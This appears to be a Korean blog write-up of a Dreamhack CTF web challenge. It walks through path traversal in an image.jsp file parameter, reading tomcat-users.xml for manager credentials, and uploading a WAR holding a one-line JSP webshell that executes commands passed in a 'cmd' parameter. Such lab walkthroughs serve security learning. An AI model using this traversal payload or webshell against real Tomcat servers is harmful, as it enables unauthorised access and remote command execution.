---
title: "Dreamhack WEB Tomcat Manager"
date: 2026-07-13
categories:
  - CTF
  - Web Hacking
tags:
  - LFI
  - Directory Traveral
  - webshell
  - apache tomcat
---

처음 페이지에 들어가면 아무것도 없다
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/6c92366a576593df3b7065084505ebb5d9347dcb472d503d6d2eb1074c21f4b2.png)
이미지가 있으니 들어가보자.

다음과 같은 경로가 열린다

```
/image.jsp?file=working.png
```

왠지 내부 파일 포함(LFI) 취약점이 될거같다. 파일 파라미터에 ../../../../../etc/passwd를 넣어 디렉토리 트레버설이 되는 지 보자

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/3df50c2f7212a90768f89a4cbd213a1250266590346b62bafb40fb395a7657da.png)

잘 된다. 이제 아파치 기본 설정 파일들이 있는 곳을 보자.

../../../conf/tomcat-users.xml

로 들어가면 톰캣 설정파일과 id, pw을 찾을 수 있따. 

```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
</tomcat-users>
```

이제 /manager에 들어가면 로그인 창이 나오고, 위에서 얻은 정보로 로그인하면 아파치 서버 기본 매니저 페이지가 나온다. 

이 중에서 눈여겨 봐야할 곳은 war 파일을 업로드하는 곳이다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/b4a685c69926a4abc50f5856055ccca6ff1963a606e363ec7100c830f76451a2.png)
여기에 war 파일을 올리면 안에 있는 파일이 바로 서버로 업로드 되므로 웹쉘을 올려볼 수 있다.

아래 페이로드를 jsp로 저장한뒤 압축하여 업로드한다

```
<% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()); %>
```

접근 후 cmd 파라미터로 명령어를 날리면 명령을 실행할 수 있고, /flag를 실행시키면 바로 플래그를 얻을 수 있다.

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/d7824a76e9fae691bbb567cb4360929b97b5a4c834e92166d0ceb380f9cdd6a2.png)

LFI, 디렉토리 트레버설, 아파치 서버 기본 매니저 페이지, 웹쉘에 대한 지식까지 필요한 깔끔하고 명료한 문제였다.
